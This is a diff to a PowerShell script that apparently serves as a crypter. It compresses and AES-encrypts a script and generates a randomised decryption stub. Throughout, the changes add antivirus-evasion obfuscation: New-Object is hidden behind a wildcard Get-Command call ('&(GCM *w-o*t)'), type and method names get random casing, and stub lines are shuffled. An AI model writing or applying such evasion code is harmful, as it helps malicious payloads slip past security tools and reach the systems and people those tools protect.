@@ -22,7 +22,7 @@ $ErrorActionPreference = "Stop"
 $PSDefaultParameterValues['*:ErrorAction']='Stop'
 
 function random {
-$base64String = [Convert]::ToBase64String((1..10 | ForEach-Object {[byte](Get-Random -Max 256)}))
+$base64String = [Convert]::ToBase64String((1..5 | ForEach-Object {[byte](Get-Random -Max 256)}))
 $base64String = $base64String -replace '[+/=]', ''
 return $base64String
 }
@@ -104,11 +104,11 @@ sleep 1
 
             # compress
             Write-Host "[*] Compressing ..." 
-            [System.IO.MemoryStream] $output = New-Object System.IO.MemoryStream
+            [System.IO.MemoryStream] $output = &(GCM *w-o*t) System.IO.MemoryStream
             if ($compressiontype -eq "Gzip") {
-                $compressionStream = New-Object System.IO.Compression.GzipStream $output, ([IO.Compression.CompressionMode]::Compress)
+                $compressionStream = &(GCM *w-o*t) System.IO.Compression.GzipStream $output, ([IO.Compression.CompressionMode]::Compress)
             } elseif ( $compressiontype -eq "Deflate") {
-                $compressionStream = New-Object System.IO.Compression.DeflateStream $output, ([IO.Compression.CompressionMode]::Compress)
+                $compressionStream = &(GCM *w-o*t) System.IO.Compression.DeflateStream $output, ([IO.Compression.CompressionMode]::Compress)
             }
       	    $compressionStream.Write( $codebytes, 0, $codebytes.Length )
             $compressionStream.Close()
@@ -118,7 +118,7 @@ sleep 1
             # generate key
             Write-Host "[*] Generating Encryption Key ..." 
             
-			$aesManaged = New-Object "System.Security.Cryptography.AesManaged"
+			$aesManaged = &(GCM *w-o*t) "System.Security.Cryptography.AesManaged"
 
             if ($paddingmode -eq 'PKCS7') {
                 $aesManaged.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
@@ -153,9 +153,9 @@ sleep 1
 
             $code_alternatives  = @()
            
-            $code_alternatives += '${2} = [System.Convert]::FromBase64String("{0}")' + "`r`n"
-            $code_alternatives += '${3} = [System.Convert]::FromBase64String("{1}")' + "`r`n"
-            $code_alternatives += '${4} = New-Object "System.Security.Cryptography.AesManaged"' + "`r`n"
+            $code_alternatives += '${2} = [cOnvert]::frOMbASe64striNg("{0}")' + "`r`n"
+            $code_alternatives += '${3} = [CoNVerT]::froMbase64STRing("{1}")' + "`r`n"
+            $code_alternatives += '${4} = &(GCM *w-o*t) "SysTEM.SecURity.CRYpTOGRaPhY.aeSManAgED"' + "`r`n"
             $code_alternatives_shuffled = $code_alternatives 
             $stub_template += $code_alternatives_shuffled -join ''
                
@@ -163,30 +163,30 @@ sleep 1
             $code_alternatives += '${4}.ModE = [SYSTem.SecUriTy.CrYPTOGrapHY.cIpheRmodE]::'+$CIpHerMoDE + "`r`n"
             $code_alternatives += '${4}.pAddINg = [sYsTem.SECuRIty.cRYptOGRaPhy.PaDdiNgMoDe]::'+$paddingmode + "`r`n"
             $code_alternatives += '${4}.BlOckSIze = ((10+50-20*2)+(4)-20/20+105)' + "`r`n"         
-            $code_alternatives += '${4}.KeySize = ((10+166-20*2)+(97)+(12+11))' + "`n" + '${4}.Key = ${3}' + "`r`n"
+            $code_alternatives += '${4}.kEysIZe = ((10+166-20*2)+(97)+(12+11))' + "`n" + '${4}.Key = ${3}' + "`r`n"
             $code_alternatives += '${4}.Iv = ${2}[0..15]' + "`r`n"
             $code_alternatives_shuffled = $code_alternatives 
             $stub_template += $code_alternatives_shuffled -join ''
             
             $code_alternatives  = @()
-            $code_alternatives += '${6} = New-Object System.IO.MemoryStream(,${4}.CreateDecryptor().TransformFinalBlock(${2},16,${2}.Length-16))' + "`r`n"
-            $code_alternatives += '${7} = New-Object System.IO.MemoryStream' + "`r`n"
+            $code_alternatives += '${6} = &(GCM *w-o*t) SYstEm.io.meMORYSTReAm(,${4}.CreAteDecRYpToR().tRANsFOrMFiNALbLocK(${2},16,${2}.Length-16))' + "`r`n"
+            $code_alternatives += '${7} = &(GCM *w-o*t) System.IO.MemoryStream' + "`r`n"
             $code_alternatives_shuffled = $code_alternatives | Sort-Object {Get-Random}
             $stub_template += $code_alternatives_shuffled -join ''
             
             
             if ($compressiontype -eq "Gzip") {
-                $stub_template += '${5} = New-Object System.IO.Compression.GzipStream ${6}, ([IO.Compression.CompressionMode]::Decompress)'    + "`r`n"
+                $stub_template += '${5} = &(GCM *w-o*t) SYSTEm.iO.compressiOn.GzipSTrEAm ${6}, ([io.comPreSsIOn.coMPRESsioNmOdE]::DecoMPREss)'    + "`r`n"
             } elseif ( $compressiontype -eq "Deflate") {
-                $stub_template += '${5} = New-Object System.IO.Compression.DeflateStream ${6}, ([IO.Compression.CompressionMode]::Decompress)' + "`r`n"
+                $stub_template += '${5} = &(GCM *w-o*t) sYsTEM.iO.comPresSION.DEFLATEsTream ${6}, ([iO.coMpReSsIoN.COmpRessiOnModE]::dEComprESs)' + "`r`n"
             }
             $stub_template += '${5}.CopyTo(${7})' + "`r`n"
             
             $code_alternatives  = @()
-            $code_alternatives += '${5}.Close()' + "`r`n"
-            $code_alternatives += '${4}.Dispose()' + "`r`n"
+            $code_alternatives += '${5}.CLoSe()' + "`r`n"
+            $code_alternatives += '${4}.dISPOsE()' + "`r`n"
             $code_alternatives += '${6}.Close()' + "`r`n"
-            $code_alternatives += '${8} = [System.Text.Encoding]::UTF8.GetString(${7}.ToArray())' + "`r`n"
+            $code_alternatives += '${8} = [TeXT.EnCOdInG]::UtF8.GetStriNG(${7}.tOARRAY())' + "`r`n"
             $code_alternatives_shuffled = $code_alternatives | Sort-Object {Get-Random}
             $stub_template += $code_alternatives_shuffled -join ''
             
